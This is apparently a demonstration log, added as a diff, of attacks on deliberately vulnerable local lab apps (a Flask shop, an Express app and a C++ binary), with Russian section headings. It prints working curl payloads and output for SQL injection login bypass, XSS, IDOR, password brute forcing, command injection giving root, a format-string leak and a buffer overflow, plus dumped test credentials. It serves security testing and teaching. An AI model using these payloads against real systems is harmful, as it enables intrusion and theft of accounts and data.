@@ -1,0 +1,64 @@
+===== VulnMart (Flask, :5055) =====
+
+--- 1. SQL-инъекция: вход как admin без пароля ---
+$ curl -si -c /tmp/jar_admin -d "username=admin' --" -d 'password=wrong' http://127.0.0.1:5055/login | head -4
+HTTP/1.1 302 FOUND
+Server: Werkzeug/3.0.1 Python/3.12.3
+Date: Tue, 17 Nov 2026 23:08:54 GMT
+Content-Type: text/html; charset=utf-8
+$ curl -s -b /tmp/jar_admin http://127.0.0.1:5055/ | grep -o 'Logged in as[^<]*\|admin' | head -2
+Mechanical Keyboard
+(видим заказ админа -> вход выполнен без пароля)
+
+--- 2. Хранимая XSS: отзыв с <script> ---
+$ curl -s -b /tmp/jar_admin -d 'comment=<script>alert(1)</script>' http://127.0.0.1:5055/product/1/review
+$ curl -s http://127.0.0.1:5055/product/1 | grep script
+        <script>alert(1)</script>
+
+--- 3. IDOR: sarah читает чужой заказ №1 ---
+$ curl -s -c /tmp/jar_sarah -d 'username=sarah' -d 'password=sarah1995' http://127.0.0.1:5055/login
+$ curl -s -b /tmp/jar_sarah http://127.0.0.1:5055/order/1 | grep -E 'Mechanical|Admin HQ|4242'
+<p><b>Product:</b> Mechanical Keyboard</p>
+<p><b>Shipping Address:</b> Admin HQ, Server Room 4, Mumbai</p>
+<p><b>Card ending in:</b> **** **** **** 4242</p>
+
+--- 4. Слабая аутентификация: 30 попыток подряд без блокировки ---
+$ for i in $(seq 30); do curl -s -o /dev/null -w '%{http_code} ' -d 'username=admin' -d "password=x$i" .../login; done
+200 200 200 200 200 200 200 200 200 200 200 200 200 200 200 200 200 200 200 200 200 200 200 200 200 200 200 200 200 200 
+$ curl -s -o /dev/null -w '%{http_code}\n' -L -c /tmp/jar_w -d 'username=admin' -d 'password=password123' http://127.0.0.1:5055/login
+подбор пароля password123 -> 302
+$ sqlite3 vulnmart/vulnmart.db 'select username,password from users'
+admin|password123
+sarah|sarah1995
+devraj|devraj_2001
+
+===== vulnerable.js (Express, :3000) =====
+--- 5. SQLi: username=' OR '1'='1 ---
+$ curl -sG --data-urlencode "username=' OR '1'='1" http://127.0.0.1:3000/user
+{"id":1,"username":"admin","password":"secret123"}
+--- 6. XSS: name=<script>alert(1)</script> ---
+$ curl -sG --data-urlencode 'name=<script>alert(1)</script>' http://127.0.0.1:3000/hello
+<h1>Hello, <script>alert(1)</script>!</h1>
+--- 7. Command injection: host=127.0.0.1; id ---
+$ curl -sG --data-urlencode 'host=127.0.0.1; id' http://127.0.0.1:3000/ping
+rtt min/avg/max/mdev = 0.015/0.015/0.015/0.000 ms
+uid=0(root) gid=0(root) groups=0(root)
+
+===== vulnerable.cpp =====
+--- 8. Format string: ./vulnerable '%x.%x.%x' ---
+$ stdbuf -o0 ./cpp/vulnerable '%x.%x.%x'
+Copied: %x.%x.%x
+0.cc474310.cbf1c804%x.%x.%x
+
+--- 9. Command injection: ./vulnerable 'hi;id' ---
+$ stdbuf -o0 ./cpp/vulnerable 'hi;id'
+Copied: hi;id
+hi;idhi
+uid=0(root) gid=0(root) groups=0(root)
+
+--- 10. Buffer overflow: 40 символов 'A' ---
+$ stdbuf -o0 ./cpp/vulnerable $(python3 -c "print('A'*40)")
+Copied: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+*** stack smashing detected ***: terminated
+Terminated
+Terminated
